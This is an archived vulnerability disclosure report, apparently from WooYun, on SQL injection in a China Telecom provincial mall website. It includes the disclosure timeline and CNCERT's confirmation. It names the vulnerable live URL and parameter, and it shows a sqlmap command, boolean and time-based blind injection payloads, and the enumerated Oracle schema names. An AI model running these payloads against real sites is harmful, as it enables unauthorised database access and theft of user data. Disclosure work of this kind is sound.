wybug_title: 电信某省商城注入漏洞可脱裤
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-07-10：	细节已通知厂商并且等待厂商处理中									2014-07-15：	厂商已经确认，细节仅向厂商公开									2014-07-25：	细节向核心白帽子及相关领域专家公开									2014-08-04：	细节向普通白帽子公开									2014-08-14：	细节向实习白帽子公开									2014-08-24：	细节向公众公开  简要描述： 看看电信的商城，，，， 详细说明：  电信商城 可注入 可脱裤   漏洞证明：  打开http://www.114mall.com.cn/注入点
http://www.114mall.com.cn/exchangecenter/webMarket/CommTypeTwo.aspx?type=02&commTypeID=0810
操作系统级数据库信息 
web server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: Oracle
注入出库 
sqlmap>sqlmap.py -u "http://www.114mall.com.cn/exchangecenter/webMrket/CommTypeTwo.aspx?type=02&commTypeID=0810"  --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutua consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not resposible for any misuse or damage caused by this program[*] starting at 13:16:06[13:16:06] [INFO] resuming back-end DBMS 'oracle'[13:16:06] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requsts:---Place: GETParameter: commTypeID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=02&commTypeID=0810' AND 7336=7336 AND 'hGXg'='hGXg    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: type=02&commTypeID=0810' AND 4577=(SELECT COUNT(*) FROM ALL_USERS1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'Tvga'='Tvga---[13:16:07] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: Oracle[13:16:07] [WARNING] schema names are going to be used on Oracle for enumeratio as the counterpart to database names on other DBMSes[13:16:07] [INFO] fetching database (schema) names[13:16:07] [INFO] fetching number of databases[13:16:07] [INFO] resumed: 20[13:16:07] [INFO] resumed: APEX_030200[13:16:07] [INFO] resumed: APPQOSSYS[13:16:07] [INFO] resumed: CTXSYS[13:16:07] [INFO] resumed: DBSNMP[13:16:07] [INFO] resumed: EXFSYS[13:16:07] [INFO] resumed: FLOWS_FILES[13:16:07] [INFO] resumed: MDSYS[13:16:07] [INFO] resumed: OLAPSYS[13:16:07] [INFO] resumed: ORDDATA[13:16:07] [INFO] resumed: ORDSYS[13:16:07] [INFO] resumed: OUTLN[13:16:07] [INFO] resumed: OWBSYS[13:16:07] [INFO] resumed: SCOTT[13:16:07] [INFO] resumed: SYS[13:16:07] [INFO] resumed: SYSMAN[13:16:07] [INFO] resumed: SYSTEM[13:16:07] [INFO] resumed: WMSYS[13:16:07] [INFO] resumed: XDB[13:16:07] [INFO] resumed: ZJBESTTONE[13:16:07] [INFO] resumed: ZJHB_USERavailable databases [20]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EXFSYS[*] FLOWS_FILES[*] MDSYS[*] OLAPSYS[*] ORDDATA[*] ORDSYS[*] OUTLN[*] OWBSYS[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] WMSYS[*] XDB[*] ZJBESTTONE[*] ZJHB_USER[13:16:07] [INFO] fetched data logged to text files under 'C:\Python27\sqlmapn\utput\www.114mall.com.cn'

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-07-15 09:47 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT直接通报给中国电信集团公司处置，按信息泄露风险评分，rank 11 最新状态： 暂无
